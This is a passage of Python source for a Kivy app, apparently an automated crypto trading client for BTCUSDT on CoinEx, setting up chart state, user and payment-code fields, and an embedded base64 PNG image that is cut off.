













from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.graphics import Color, Rectangle
from kivy.uix.textinput import TextInput
from kivy.uix.togglebutton import ToggleButton
from kivy.clock import Clock
from kivy_garden.matplotlib.backend_kivyagg import FigureCanvasKivyAgg
from matplotlib.figure import Figure
from matplotlib.patches import Polygon
import sys
from kivy.uix.spinner import Spinner
from kivy.core.clipboard import Clipboard
from kivy.uix.screenmanager import ScreenManager, Screen
import qrcode
from kivy.uix.image import Image
from kivy.core.image import Image as CoreImage
import io
import os
import requests
import random
from datetime import datetime
import json
import base64
import webbrowser
import time
import gc
from math import isclose
color_botones= (14/255, 173/255, 152/255)
#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
class MainScreen(Screen):
    #-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    def __init__(self, **kwargs):   
        super(MainScreen, self).__init__(**kwargs)
        self.registro_saldo=[]
        self.nuevo_valor=0
        self.xdespl=1.2
        self.colorall="black"
        self.optimizar_calculo_beneficio=0
        self.Inversionttt=0
        self.Precio_entradattt=0
        self.Direccion_entradattt=0
        self.Apalancamiento_entradattt=0       
        self.call_conador_operacion=0
        self.Inversiontttp=0
        self.Precio_entradatttp=0
        self.Direccion_entradatttp=0
        self.Apalancamiento_entradatttp=0    
        self.call_conador_operacionp=0        
        self.direccion_arriba_abajo=0
        self.rev_cierre_por_stop_loss=1
        self.izquierdag=0.1
        self.derechag=1
        self.precio_referencia_pivot=0          
        self.flec=6
        self.invertido=0        
        self.limite_stop="a"
        self.limite_take="a"
        self.rev_wait=0
        self.pivot_pincipal=0
        self.deplx=40
        self.ejecutor_registro_beneficio_call_put=0        
        self.pnl_decimal=0
        self.pnl_decimal_put=0
        self.AUTO_OPERACION=0        
        self.actualizador_take_stop_call=0
        self.comprobar_iniciar=0
        self.contador_inicial_operacion=0
        self.comprovar_primer_pred=0
        self.comprovar_primer_pred_comparador_dinamico=0
        self.detector_zona_problematica=0
        self.invlist = 0       
        self.INTEL=0
        self.R1 =  0
        self.R2 =  0
        self.S1 =  0
        self.S2 =  0
        self.XR1=  0
        self.XR2=  0
        self.XS1=  0
        self.XS2=  0        
        self.R1E =  0
        self.R2E =  0
        self.S1E =  0
        self.S2E =  0
        self.XR1E=  0
        self.XR2E=  0
        self.XS1E=  0
        self.XS2E=  0        
        self.R1E1 =  0
        self.R2E1 =  0
        self.S1E1 =  0
        self.S2E1 =  0
        self.XR1E1=  0
        self.XR2E1=  0
        self.XS1E1=  0
        self.XS2E1=  0 
        self.eficiente_renderizado_lineas=  0
        self.type_vela_1="-"
        self.type_Pivot_reg_1="-"
        self.Pivot_valor_1="-"   
        self.margen_call_1="-"        
        self.margen_put_1="-"        
        self.type_vela_2="-"
        self.type_Pivot_reg_2="-"
        self.Pivot_valor_2="-"   
        self.margen_call_2="-"        
        self.margen_put_2="-"       
        self.type_vela_3="-"
        self.type_Pivot_reg_3="-"
        self.Pivot_valor_3="-"   
        self.margen_call_3="-"
        self.margen_put_3="-"
        self.type_vela_4="-"
        self.type_Pivot_reg_4="-"
        self.Pivot_valor_4="-"  
        self.margen_call_4="-"
        self.margen_put_4="-"
        self.type_vela_5="-"
        self.type_Pivot_reg_5="-"
        self.Pivot_valor_5="-"   
        self.margen_call_5="-"
        self.margen_put_5="-"
        self.type_vela_6="-"
        self.type_Pivot_reg_6="-"
        self.Pivot_valor_6="-"   
        self.margen_call_6="-"
        self.margen_put_6="-"
        self.type_vela_7="-"
        self.type_Pivot_reg_7="-"
        self.Pivot_valor_7="-"   
        self.margen_call_7="-"      
        self.margen_put_7="-"
        self.type_vela_8="-"
        self.type_Pivot_reg_8="-"
        self.Pivot_valor_8="-"   
        self.margen_call_8="-"
        self.margen_put_8="-"       
        self.skfkjsdkfjs1= "-"
        self.skfkjsdkfjs2= "-"
        self.skfkjsdkfjs3= "-"
        self.skfkjsdkfjs4= "-"
        self.skfkjsdkfjs5= "-"
        self.skfkjsdkfjs6= "-"
        self.skfkjsdkfjs7= "-"
        self.skfkjsdkfjs8= "-"        
        self.posible_pi_1= "-"
        self.posible_pi_2= "-"
        self.posible_pi_3= "-"
        self.posible_pi_4= "-"
        self.posible_pi_5= "-"
        self.posible_pi_6= "-"
        self.posible_pi_7= "-"
        self.posible_pi_8= "-"        
        self.Activo_run_1= "-"
        self.Activo_run_2= "-"
        self.Activo_run_3= "-"
        self.Activo_run_4= "-"
        self.Activo_run_5= "-"
        self.Activo_run_6= "-"
        self.Activo_run_7= "-"
        self.Activo_run_8= "-"
        self.pivot_predx = "-"  
        self.pospivot1 = "-"
        self.pospivot2 = "-"
        self.pospivot3 = "-"
        self.pospivot4 = "-"
        self.pospivot5 = "-"
        self.pospivot6 = "-"
        self.pospivot7 = "-"
        self.pospivot8 = "-" 
        self.operau = 0 
        self.ejecutor_xxxxxx=0
        self.detener_funciones_1 = 0
        self.detener_funciones_2 = 0
        self.promedio_V=0
        self.variable_act_take= 84
        self.variable_act_stop= 133
        self.color_cruz = (0, 0, 0, 1)        
        self.variable_padding=8
        self.variable_spacing=8                              
        self.alphasti=0.5
        self.TAMAÑO_TEXTOS='12sp'
        self.estilo_letra='Roboto'   
        self.tamanio_letra = 9
        self.tamanio_valores = 9
        self.linewidthANCH1=0.7             
        self.estilo_letra_ENCABEZADO=self.estilo_letra
        self.grafica="1min"
        self.grafica_a_manejar_comprobador="1min"             
        self.comptiempoactual=["1min","5min","15min","30min","1hour","4hour","1day","1week"]
        self.escly=1.5
        self.ancho_cuerpo=1.5           
        self.ancho_mecha=self.ancho_cuerpo/50        
        self.grosor_linea3=0.6
        self.grosor_linea33=1.5
        self.estilo_linea3=":"       
        self.cambio_grafica="a"
        self.saldo_inicial=0               
        self.graficaSSS="BTCUSDT"
        self.grafica_a_manejar_comprobadorSSS="BTCUSDT"
        self.TIPOVELA="1min"
        self.precio_running=0
        self.apagar_funciones="no apagar funciones"
        self.idinicio1="no paso"
        self.idinicio2="no paso"
        self.contadorpoli= 0       
        self.utimopivot= 0
        self.utimopivotE1= 0
        self.utimopivot_entrada= 0
        self.contol_precio= 0
        self.contol_precio111= 0
        self.ValordeYmarcador= 0
        self.ValordeX1marcador= 0
        self.terminacionejexxx= 160.5
        self.hdahdahcontador= 0      
        self.precio_anterior_comparar= "no registrado"
        self.color_ant="blue"
        self.continuidadtendencia1="Neutral"
        self.openvela1=0
        self.sin_precio=0
        self.open_prices = []
        self.close_prices = []
        self.high_prices = []
        self.low_prices = []
        self.id_velas = []
        self.volumen_market = []
        self.lista_poligonos = []
        self.x1l= []
        self.y1l= []
        self.x2l= []
        self.y2l= []
        self.x3l= []
        self.y3l= []
        self.x4l= []
        self.y4l= []
        self.x5l= []
        self.y5l= []
        self.x6l= []
        self.y6l= []
        self.x7l= []
        self.y7l= []
        self.x8l= []
        self.y8l= []
        self.x13l= []
        self.y13l= []
        self.x16l= []
        self.y16l= []
        self.x19l= []
        self.y19l= []
        self.x112l= []
        self.y112l= []        
        self.perdida_fee_1=0
        self.perdida_fee_2=0        
        self.direccio_pivot_principal= "-"
        self.resistencia_crestaszz=[]
        self.interaciones_resistenciazz=[]
        self.soporte_valleszz=[]
        self.interaciones_soportezz=[]    
        self.resistencia_crestaszzE=[]
        self.resistencia_crestaszzE1=[]
        self.interaciones_resistenciazzE=[]
        self.interaciones_resistenciazzE1=[]
        self.soporte_valleszzE=[]
        self.soporte_valleszzE1=[]
        self.interaciones_soportezzE=[]
        self.interaciones_soportezzE1=[]                   
        self.RRRX1 = []
        self.RRRY1 = []    
        self.RRRX5 = []
        self.RRRY5 = []
        self.RRRX6 = []
        self.RRRY6 = []                         
        self.RRRX13 = []
        self.RRRY13 = []
        self.RRRX17 = []
        self.RRRY17 = []
        self.RRRX18 = []
        self.RRRY18 = []
        self.RRRX1S = []
        self.RRRY1S = []
        self.RRRX5S = []
        self.RRRY5S = []
        self.RRRX6S = []
        self.RRRY6S = []
        self.RRRX13S = []
        self.RRRY13S = []
        self.RRRX17S = []
        self.RRRY17S = []
        self.RRRX18S = []
        self.RRRY18S = []                
        self.RRRX1Snn= []
        self.RRRY1Snn= []
        self.RRRX13nn= []
        self.RRRY13nn= []
        self.RRRX5S22= []
        self.RRRY5S22= []
        self.RRRX5xx= []
        self.RRRY5xx= []
        self.RRRX5ZZ= []              
        self.RRRY5ZZ= []                       
        self.RRRX17Szz= []                
        self.RRRY17Szz= []                 
        self.RRRX1l= []                       
        self.RRRY1l= [] 
        self.RRRX5qq= []                     
        self.RRRY5qq= []                        
        self.RRRX5qqm= []                         
        self.RRRY5qqm= []                        
        self.RRRX5e= []                 
        self.RRRY5e= []
        self.instancias_a_eliminar_contador = 0                
        self.instancias_a_eliminar1 = []
        self.instancias_a_eliminar2 = []
        self.instancias_a_eliminar3 = []
        self.instancias_a_eliminar4 = []
        self.instancias_a_eliminar5 = []
        self.instancias_a_eliminar6 = []        
        self.listalerta=[]
        self.intjj=0
        #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        self.valor_actual = self.leer_valor()        
        if self.valor_actual is not None:
            if self.valor_actual<=0:
                self.valor_actual = 1000
                self.registro_saldo.append(self.valor_actual)
                nuevo_valor=self.valor_actual
                self.modificar_valor(nuevo_valor)
            else:
                self.registro_saldo.append(self.valor_actual)
        else:            
            self.valor_actual = 1000
            nuevo_valor=self.valor_actual
            self.modificar_valor(nuevo_valor)
            self.registro_saldo.append(self.valor_actual) 
        #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        def modificar_valor(ruta_archivo, nuevo_valor):
            # Asegurar que la carpeta '_internal' exista
            None    
        #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------    
        self.conseguir_precio_en_tiempo_real=0       
        self.main_layout = BoxLayout(orientation='vertical', padding=self.variable_padding, spacing=self.variable_spacing)
        self.anch_boton=0.05        
        self.cambio_us1=0
        self.cambio_us2=0
        self.cambio_us3=0
        self.cambio_us4=0
        self.pivot_possible_pred_list = []
        self.pivot_possible_pred_list1 = []
        self.comprobar_si_A_y_B_aparecen_1 = 0
        self.comprobar_si_A_y_B_aparecen_2 = 0
        self.comprobar_si_A_y_B_aparecen_3 = 0
        self.comprobar_si_A_y_B_aparecen_1A = 0
        self.comprobar_si_A_y_B_aparecen_2A = 0
        self.niv_pos=1.1        
        with self.main_layout.canvas.before:
            Color(0, 0, 0, 1) 
            self.rect = Rectangle(size=self.main_layout.size, pos=self.main_layout.pos)
        self.main_layout.bind(size=self._update_rect, pos=self._update_rect)
        self.Contenedor_2 = BoxLayout(orientation='vertical', size_hint=(1, 0.3))
        Contenedor_2vvv = BoxLayout(orientation='vertical', size_hint=(1, 0.03))
        Contenedor_2vvv2 = BoxLayout(orientation='vertical', size_hint=(1, 0.03)) 
        Contenedor_3 = BoxLayout(orientation='horizontal', size_hint=(1, 0.06))
        Contenedor_3zz = BoxLayout(orientation='horizontal', size_hint=(0.15, 1))
        Contenedor_4 = BoxLayout(orientation='horizontal', size_hint=(1, 0.06)) 
        Contenedor_4xx = BoxLayout(orientation='horizontal',size_hint=(0.15, 1))        
        Contenedor_5zzz1 = BoxLayout(orientation='horizontal',size_hint=(1, 0.06))
        Contenedor_5zzz1ggg = BoxLayout(orientation='horizontal',size_hint=(1, 0.06))
        Contenedor_5zzz2 = BoxLayout(orientation='horizontal',size_hint=(1, 0.06)) 
        Contenedor_5zzz = BoxLayout(orientation='horizontal',size_hint=(1, 0.06))
        Contenedor_5zzz333 = BoxLayout(orientation='horizontal',size_hint=(1, 0.06)) 
        Contenedor_9 = BoxLayout(orientation='vertical',  size_hint=(1, 0.06))
        Contenedor_9w = BoxLayout(orientation='vertical',  size_hint=(1, 0.06))        
        self.widget100l = Label(color=(1, 1, 1, 1),text='COINEX_AUTOMATIC_TRADING user:',size_hint_x=1,  halign='left', valign='middle',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        self.widget100l.bind(size=self._update_text_size2l)        
        self.widget100l12 = Label(color=(1, 1, 1, 1),text='Payment code:',size_hint_x=1,  halign='left', valign='middle',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        self.widget100l12.bind(size=self._update_text_size2l12)
        self.widget3 = TextInput(hint_text='Please enter your COINEX_AUTOMATIC_TRADING user', multiline=False,halign='left',background_normal='',foreground_color=(0.5, 0.5, 0.5, 1), background_color=(0, 0, 0, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        self.widget3.bind(focus=self.on_focus1)        
        widget3p1 = Button(text="Paste", background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        widget3p1.bind(on_press=self.paste_from_clipboard1)        
        self.img_base64_2 ="iVBORw0KGgoAAAANSUhEUgAAAe8AAAC8CAYAAABR5CYgAAEAAElEQVR4nOz9Z7Bm13XfDf52OOc86cbOOaIDMgmAOScTlmjTnNLItqSyOOWRaJXL9gdPlWfGnqmya8qf7Kr3LTnJfm2rLMmSKFGS9YoiBVEUE8SAHBoNdKO70Tnf9IQTdpgP+5xzz7243QBINAgCzx910fc+4cR99tprrf/6LwF43kQQQtyS7SoJ3odT9R7wr7QfueIvh70lxzXGGGOM8VaGAFT5uwccaxkdWf4IkBKkBinCxC3K99XyR1ZuTJYbFMubwoN0y5tf8Rn/k/evMOFPr8HmUAzRN7/sby0IIfDeI0RpwMcYY4wxxrjFkPjSfNvKEFW+kQ8/0nscgv/f//7vydqTfPmxJ5g5dIht99xDvGEzvt1lMc8Rbc2wGBFFCu8csRfgPBKFR6KUIjcFAFpLjHcI4RFOgHDBiL8J//VOIKRHoOq/PRa8xAkQRMF+UbB5sMT//sA73l7Gu8LYcI8xxhhjvLFwSLhBBNPjQQmiOGZ66xbelXTYeMedzCnNXJrRHxWo6SmMismiFtdMgZ5oY40HJZFekFuLRyK0wFqL1gqcx9oCpRTu1gR1bymEEMGAe0CG6+TwoKK3l/H2Y6s9xhhjjPGGwuMIAWwLuOBtW5bD34DQCu8MNltELV7lnm4LdfkMmyz0iwLVbnP94gn0lu08cfEqm26/g/PXB8h2h1FqUJEm0goiGBYpqhWTZSkxklhHWO+QXq51eD92eO+RUuK9r22UlOWx+hX/YIXBCQvCvr2M9xhjjDHGGG88vCjzz75hsxuGyVkLUjEzPYG2KXFWcOHkMTZt2MC6do/B0nUmWy1a2YCJ2R4XLp7joYf+ggf/7s+z4MFrxXyWMzQOlWjywhLFCT4zOOdASNwax/XjRtOhDCn5cHVc4z3vPQqJ91Xa34Fwbz7jHXLSr398Y+x1jzHGGGP8GCBYkeP2LhihZd6ZxCHwQtKKYiwWESvWbZlBR5J+1sf7GGEdw3MvMdVJYDTiH96xE3nqOQYTU/zxk09z28c/QaszxRygBAgP1gfimxcVu+3NBV+uYKx3CCFq2+e8q99DgEOgEAgn0VYFnsCP66DHGGOMMcZ4m+CGvlMwQd57MJZutwtI8twQxS2M8MhI44QjkhC5lN0zE2xyGbtEQe/iadZfu8hnbz/Iiw99lYn+Ep1hSqfwRBZiJdDlKsGXrPU3079CKLwA5wi57Mb7SIEQCiEqrj4ILxFegpdvP+M9dsDHGGOMMd5AVE5vmfKm/NWUPxZQOgYhGfUzYpmgRAt8hC1iEJpOS+EYMTXV4/ljLzDIDdZBN1Lsm5kiOn+an9q7nRf/1++ybXiVTX5ENOwTGw8FKCdKw/fD/cuP+P2b/StRKKHL/VDua/n9Cg6wQuCR4MWbL2w+xhhjjDHGWwfNOm/LypLsUMossdaAUpy/cI4dO3awtNRnYmIC5R0tGYHPQDgG/T7ee6JWm0E64uDe/QxHi+yf6uJ7MXs+9kFeXLzOEh7lFKYj6IuIkYgAgRMeUTpwyi275OHX8Hd439f/1ufhxS37VyrwPuS1y9qwxvsrr6cXofb9TWm8q/z0a8l9N3Paa33vVnvc1T7HufUxxhhjjLXhIUTK/aoXhQLn2LdnC8aO6HQV0qdoY+kox9IoZWJmmrnFAfu276bwIGYlhclQwrBtusu1hessnH2Jw1t3sLC4SDstyLsZ871pLjCB72hSH0rVlNNogl2wBO2TsKjwCBzSO5wALzwegZD6JqH/1wOiYTs83gfGuShD6kIInHMY47C2AOHfnMZ7jDHGGGOMtxbWsn2VjlgQa7Eol2PNiMhrIq/pSuhImJ6ZQEQK1Y5pO0eiItKiIDcOHUmKfMhsp0VbCLAFnXxIV2lGruD0/FXoWq7aDrIbUUQKYcA6iDSYolQyEx7hwq9OSEKgWiAAgeNWUsSc83XJWCUmBmFx4ZwjUgovBFprhA5xjLHxHmOMMcYY45ahFFEL6e7aWgcsk9AdCs+k1jivEbKFdIK2g0Q6sIsUxjFpFXEe4aMuSipSrxAqJi0KpPIoHeOspe1yYmXxhaDtHFszwdHhHOfVZq7YCLSmEJ7CSqK2wtrGQXlVk8ZUmaP/cfDUm6Vi1lp8yUavasDfdoS1McYYY4wx3ljUue4m6kooh8Qi8bSEoCclk1rTk9ARjqjIiHxGm4KuLJBZn3zhOpEpiJUiHQwRSpEZG8Lp0hMLT1xkxIMF1mVD9tgRh6XlxFf/hE1FStukxN7RaivSPA/HUZZfyTp6Leof+Yq9MH40NMvEmmIt1evN1yqMPe8xxhhjjDFuMVYqhoXK5fAvhOC0ArQtkMaiycB6Ii8QWJwH48vmHKagFyeMsgGtWONbMYX0ICVGgPUeRUESR+AEykM2WGCdjPi/3XOYFy+dobtlB+ccjFLQUoMXCA8idK1C+XCEtcd9i6VVV3O2lo13mfv2Hr+KyzU23mOMMcYYY9w6rG6UxUpb6AElJMJbtBBo5RHeIQQI4RDe46zHeUEraZOmhpb0DId9olaLkSnQrRYdpXFSIoTEZDkGgzMWkCRRzITN6aJIUBw5fw47vZ65Xo8lLbE0tc9d6YUrrHj58d4KrPS0mx53KZ8qRL3uqSVUb/ExjTHGGGOMMcaahtuWP7m34XfvkFJivcPhyX0RGOIyppVMUqQFsdLs37mD6ViRX7vAew/eRnr2DHG/z4xzbOn16EYJWioQCh1FQbnTWeSwz6ZsyP3CcGhpgWNf/TrRYobyFi/ssowrgLCUbDVuMdV8BSqDvVblUvOlsec9xhhjjDHGG4KmUmpNYKMktZVGS8hQFiW1xnuBFBLnFEVhUSoiy0Y8++zTdLtd1vXaZPNX2TY1wYaN69GtLrmUXB8uAQIpPIIYvKAtJUoIBsMhbS+ZHyzy2cMHuIblUpGxhA4iKKLp01Zd0G6tn1s1JoHALnfO1czzZulz5ZXf+iMaY4wxxhhjDBGaaZQSYmt+xBMMkzUeJSO8C6beeYEShNaesaA9kRB3NP10kY0b1/PSiRMM5+eZSRKiIqddZOzbsJ5D2zZx945t7Ns4TWQGJL7AD0dMRi10XnDbdI873IDNF09x5E/+TzrpCOU9XoP1Ai9CpzMpfHnstw5NZrkQAqXUitz3Wp8de95jjDHGGGPcOlT5bm7uLQooZUFpeOQS4R3GGqSU9IcDOr0ui4vzdDodTp89w9btO5mcmGJxacCFy1eYmJlmdv06CpsjnQNnOLB9K7kD6ySnzp4HFRNryWYpkLrFL9x3D2eHIy4JybzV6Fab3DiiKApdyd5EGHveY4wxxhhjvHHwa/jcZZMN4SUKUB6UlygnUE6grUQ5CUiM8/Qmp5hb6nPw7nsZWs/OA4c4eeE8fWexLc26HVtpTfbIXUGe50gE0hhENiJ2Bcob9u7cTidWmP48HWvYkA95p7RsPHOC7f0RW7xCjEYIX2AdFMaF4/wxosk+rzD2vMcYY4wxxnjDUBnw1QFhQaixlk0jX4arI6mQSEzhmZ5ax7EXTpC0ungUO/fsxSuNx6CjuAw9S5A25I5RJC1JP83o9ToUFnZsXo8l5NbnFvr0+/O8c6LNi+mQF48dZ/2dt9PvtOkbQxRFeMubDmPjPcYYY4wxxq3FK5C1V/q1QYrUC+pKa2kVznv2HdjPiy+dYu+uvegkZqI3xShLg4eMYzhKQQraSQu0xliBihKGWUqSJBTDIaktiNsdFII8NWzq9dgQJ7jr8+T9y/y1zdOcW0q5aCWup1jCIlT8Y/W+RVkqVpH6YBw2H2OMMcYY4w1As5HYis5ijdedACsdVjqcCP964XC+IIo0z79whLxIOXXqFKZwXL8+j7cwNzdHpDStVoJSEmMMAMY5vPcoFYOImJubo6UitAAtPLG3aGdIhGXLVIvNpKxbvMZ+m7Fpqc9GC1MIojdJ3ntsvMcYY4wxxnjDIILw6PJPZbhLFnr4D4z0GAlGOYxyOOmw0kJsyN0icUtgpcUqj1eCNM84fuJFOu02wnnMcEjkPUkcESmJEg7nLHhJlhq2bNkeOnOlOdJZ2p2YKJaM8gGdWCNGQzZL2OMzbiNnen6B6dyif8y2u2KeO+drAt3ra7xF4+dH+W7j+0Gy7ofYnF/+97V//+WXRYzXOWOMMcYYPxJuNBVX3vhqCfE6P+4tTjiGWcqePXvKUirPhQvnWFpaQgiBVoJWHKOExJsCW+ToSNbs7DiOybKMJEmI4xhXGIzJcc4QS4lLhxzYvp3D2zfT7V9nZukKd8TQunSejslQ3pXa5ysPsnqtthC3oKysIqo1xVtevUUSK399mZ1dbbTr31euuIRQSNTLv1t/XICUCCXBeySgpXyZAa6McvUjEfWP8CDw5fclN+oLLoRANf4TCHwpI+BX/F4y/co9rD6nKj/jGwX0zesj67ZyN99GvSK91Vp8Y4wxxhhvIOpQOWW9t2fFTz1vWk8kFT61xF4jXZgQBTGCGOUkVy9cYsemLSgE3lvuuusOsiLFekduDEVhsYVDqQjjHJZQp+2dASFweIyzIDVCKIT36MIxFbXQ1pJYw84N07xr92a2Xj/D5a/9n0yZAS3l0VaU2xYYVwAESVcHyglkWccuccuz+uvQ1MS5UP+ttUTrQFV79cb7R1SHE8KHH+/w2NVvImQlXO/BObx15W491lk8K+XiHH7FT2U8l98Pt9xRrVZW7A5E2J7B4DA4HKL8L0jSB/NN+TpQviYQa7jy1aKhQnNsujdQWm+MMcYY402LhlZ488eXjpr0Aiy0dIQ3lkjGWOtxSJSMUCpi7+7dnDp5kkgK9u7Zw4lTLxJFwVBHUfCqpQx57yB4siqUW8KLZc9eSYnPDbEQuGyEcjldlzGd9vnFj3+QFx76KpPDIW3v6bQkeW6I45hYC9Isr7fp1rBD7ocJHb8K/FCx4FWLpmXBeb/qQ0CtqOM90vvai13+iAQnAhXfS3Ch7k8SZPGQIJRY3o/0iCBZWy5rBEgRjDseJzxOgpAapEKo0ouX5UWtHNxyG6L82+FAQlhDOJSwKGGRWBA2LBGEL7Vvw0JEEn6UAFylkNPYSdMzr8/arfpZfZ1WXsexIz7GGGO8HeBY9sCdWxZIUTKiKIKXm2UZTz31FHv37uXZZ59lcnKSHTt24Jyj0+kghKAoCo4ePVr/bq1dbvN5AyilsNZSFAVJkoDzjAYDhDVsSlr8tZ37OWggSZeweU470hSjFOc8URJjlKeQHickHo1DBRdwlTF/PfGqjXdpI5dRx4RFHZBvhrFXfG6tHa3SbJUItFREShMpWVLjy3ZxQhBFikgHyTjnfcOYC9DyZT9OC5wSWAm2NNxeAVqB1nilsDLYXOsrwy7K1ZjHiaodm0ApiVICoURZiAgh1uNRYjkIrjwoGsa2umgynOuyZz/GGGOMMUYTSoDxDmstcRzT7w9RKsJaS6vVwjhLp9NhojfFqVOnyK3hqaeeIssy4jjm8ccfByCKIvbs2YPWmiiKaFqftZxgB1gXnDcdSVyREymBVgqbZQwuXea+mVnk8WNMLS0wQ4HLRmitkWXo3gmHk2BFFbdtbv3WsN1es+ctKsdSlNatVMeRjcyxqnLPQiwr0dfp3PI/oZBSI6VEyuXDqHIFSoiQSxAS6R2usLjCgg2ZaKEkMtIQa1ASVDDKRFH4V+vSUJc/3S7EbZyMsV7h0CBjSBJotSCOsUphRThQ68oG8j6w/ISSoEpBoPoagBMO4R0aseJHIpZlAWtmZTD4TXH51Tf3Bry9McYYY4y3NKwPDTqk1qH9Z7eDcZZ2t0NWhFy294KZmRnSNGXdunXkeU63O0GeGe688+66RKzdbjMcDoGV9qWCEytD3N770M3MWrTWWJPji5wD+/YyE2k2uoL9CvYUI649/hgdJfAasmwELnQjc8LVhrvabpjHK1331xevu0iLQNYe84rXpcb7ED53CGh0TZGIcOLOYMu8slIKoRQWj/ECoWO8rKymBy3xkYJIB+9WCVA6xL1lxR6jXGBUByFK6+uDy+0MGFf/63NTuuIajMUiEUqBNRhnwn7LbVWev0AFj9yDcL48/xD7FoB3Ieu95rW6gfD88rUU9VLxJh8bY4wxxviJxYpsa8mmtiUnKbdFmSIVdHpditxy9sJ57rn3Xo6dOEnS6gCg4oh+v4/WOnzfWtrtduA1GUMkdVBuW8MjqnLf0nu01oyGfZJOF6Ekwzxj9+ZNHDt9kd0z68nSlMEzz7L1/gdIEYg4xji36iyWUYXr19rvj4ofyngLv1YcX7JMzQq/N76BdeBRVBQuKDuolP1bo0jhnKDwgR3oNMFjlgAKL2OIy59WDBMdotkpWjPTqE6L9uwUstUi7rSJOi10q03cSkiSJNyQNEMJiRQCmxeki30Wrl1jcHWObGGRwZXrsLAIaQFpDv0B5AZjPbh0matfFet7SkqbpBAurBNkKGkoT65kvYczlnK1AV55s1dmJBplB77SGBpb7zHGGOMnFTfuJFZByWBBssLQabcZDAbE3TZZkbFz525arRZSKtIs47nnnkdoRRRHoROZNSiliOMYa4MsqrUWKSVxHOPN6v2vaEwKBLsjC0+SxOAshcmJlSTLhugWzC9eYQMtfumTn+CR/pArccLIg2q3Ed5WbmWofvKgAmu63tvr7Xu/auNd86iqq10JpZeecrgUsiy1X0Zl6H15IkLK2lAFQycwzpFZg1ASX4W7IwWtBNoJJG2Y2UiyfiPrN29iYsMs7elp9GQX0Y4xkUZ2WpCEMLpXQUrPCcilxmgRFgRlfhrjSPKCDVnBhixDZ5YOgqWLl8ivLTK6dp3Lp8+wePkaLA1g/jrYDEwBhQVrS489FM3jKy/Z1YS8asWlRDDfgYzxcg96rdfWQrUIGGOMMcZ4y0EKjPPEcUxLawb9Afe/69089dxT3HbwEEePHsUUlomJCTZu2UxnosfuPXsCX8l7oqgy4sFwa63ryGZRFGih6l2JkrbU9Iar72AD/yo3Bq0UkYowGNJ8SCtK0FmKN4bz33+EmXe/F9FpM6xKiUvOE5Tzf51gr1hRry9e0XiL0vg0Y/i+cZDLJCyPwQXjLILgex0S9oGRLYQMjcZxyJLxjQCpY6z3wXB32jDZg5kZ2LiO2e3b6W3dDt0p2jOzTK6bIem08XGMkVAITyEEmbfB4EuJL/cDoGQEkaAgD0xx72vOmUaQeI90gkGeozfN0vMSOxwxdX0Ol6WMFvssnD/H9ReOYa/PY65ch+vzwTs3IJwFY/EynB/CgXM47wLBT4bSh+pSSClwLpSuVYa7vMTlv8sjapmZP85+jzHGGG9dCBRg8MCOXTuxRrKwtMTuvfs4duwYAsmdd95BHMcMs5T16zYyGmU1Gdg3jXMZJa3FTF4e9gyve6iMqpSSkrMWDLkQOO8o8gypggBMZnJiFSOHizx46A4evb7AIGlhpECVZUtlFXKIyXqHLW32raCsvaLx9t6XjPLlZG/zz4pYZUtD5KuwcvkBpUTZ7k1iXYEHtNY46XGuACGx7SQQzDod2LyJyb17mdi9k/amTbQ3bCSamaFI2ngdM5CCOW8pvAMtsUrjlUBohZPLZQbW+rqxuSA4ymhQKkbLcJm9MwjjEN7Q7sSotiaTGj3TQW6cIJGSrvVMz+9l1zvuYHThEpdeOMnV4ycxZy/CQh8/GJUrGldluQOTXmucMXjjUIqqWm5FzXllvL1/ZfM89rrHGGOMtyq8c0RK0O8PabVaPHfkOLv37ifNMnQccagkow2zFOc9vckJlgZ9cJRM9Nf/mKroqXRgBgOiVpd2LJkfLjEZ9Xn+4R+w/v/yGXTcw5eLAOGr30xJigulz7cCry5s7ivadPX3Mok8ZCkErlTJ8TWrLhDGrPUILIG7LZFCBkOvJHQnYKIHM9Mku3bQ276dyV27aW/eQrRuPWpiEqcSBt6RK3Ba4oUI+jVK4KTACUmBw5ZxeSEEPqjOA2FFpQTEUuGcwTnIy+J9qSRRK0KKhEE6QgjPCIMQDhVBpDzKC5jt0ZnuMLVrC5N3HGTb+UvMv3CKqy+cYOn0edz1OVjsQ5ZBOgTv8TiUluAdxgY+3WqhGCllIPEtX9b6KjcpEGO/e4wxxngrQypFYQuUUjz8ne8yPbuJ/nBAZ7LLnt37WFjsE0URcdImTdMQCtcavKSw/oYqmjdC7YuKlf9Ws7Fs+MoSyXTUZu++25hb6lMwRDiDvn6FSWNJPfSFwyNRPmzFV2z2sszqVui0vLpUasXaZrmOu9JIgUDcKsqQOVLUxfbe+5Af9hIdRRgPeBvKu7ptWDcLu7bR2bmDPQ88QLxpE3J6hoHQpABRCy80mTVY7XDKB1kU4UBphAoev/WuZKIvHyflMYRD98SUJV+1NqwL74ugmCaFR4lAMvPeIYUPIXHvUd7RlRqRGVRR0DWeZGgYnDvPhWee59rxFxk8/yIMRzAYwWgIo7RM9Fc5FlmXIzhv8YBSEmvdiry3WBU2r+rCxyptY4wxxk88qmm6WbUDgCTGcfbxh+koydHnXmTbju20el2sNxSZQcogDeoIDPIkSUhzU1ct3Qw3Y303ydfVcTWNt0OilGZplNKZnubasOD45SUuTq7jl/7H/+DBf/r/oN/ukEtdG+/QFa0MpXuB+BHLhZYJb4Jd/Tl+9+79r4EHVeYUBC4Yb1HJgYZNWhk+Y11gWwsdh4vifCjh8jbUU7e7MDOB3LqNmQN72XDH7Uzu3UM+OcGikqRCUwiB8+HEJQKpBV57jCxwliCvKhS+vCNeBENY74/l46pOUPiwsJCIuu7PE8gNwlmELJXSCKzxSAZj751DSwFZgZaKWAoiIVCFQ2Up0SClNcp46dHHuXb0OIsvnIRLV2GhD5lBGIsvTJkTcWVuxeEoDbmzrBx3cpX4/Nh4jzHGGG8R3MR4axznn/ouZ55/Hu80upWwc+9uLJZIRoyGWanvrQOTPNK1B36zktu1IL24Qf